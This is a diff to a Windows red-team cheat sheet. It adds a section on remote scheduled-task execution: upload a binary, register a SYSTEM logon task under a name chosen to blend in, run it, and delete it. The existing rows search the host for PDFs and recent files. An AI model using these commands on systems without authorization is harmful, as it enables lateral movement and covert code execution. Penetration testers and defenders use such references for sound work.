@@ -1,4 +1,4 @@
-# WINDOWS BASICS
+# WINDOWS FIELD MANUAL
 ### Windows Administrative Binaries
 | Windows Administrative Binaries | |
 |----------------------------------|--------------------------------------------------|
@@ -157,7 +157,6 @@
 
 ## Windows Data Mining
 ## FILE INFO & SEARCHING
-
 | Description | Command |
 |-------------|---------|
 | Search for all PDFs | `dir /a /s /b C:\*.pdf*` |
@@ -166,3 +165,15 @@
 | Display all lines in a file that match case insensitive <STRING> | `find /I "<STRING_TO_SEARCH>" <FILE_PATH>` |
 | Display line count for a file | `type <FILE_PATH> | find /c /v ""` |
 | Enumerate recently opened files | `dir C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Recent`<br><br>#Then run the following command on the .lnk:<br>`type <FILE_PATH>`<br><br>#Look for full file path in output |
+
+## REMOTE SCHTASKS EXECUTION
+
+*Upload binary to remote machine, create scheduled task pointing at that binary, run task, and delete task. Can change "OfficeUpdater" to any task name that blends into target system.*
+
+| Description | Command |
+|-------------|---------|
+| Add task | `schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH> /s <IP_ADDRESS>` |
+| Query task verbose | `schtasks /query /tn OfficeUpdater /fo list /v /s <IP_ADDRESS>` |
+| Run task | `schtasks /run /tn OfficeUpdater /s <IP_ADDRESS>` |
+| Delete task | `schtasks /delete /tn OfficeUpdater /f /s <IP_ADDRESS>` |
+
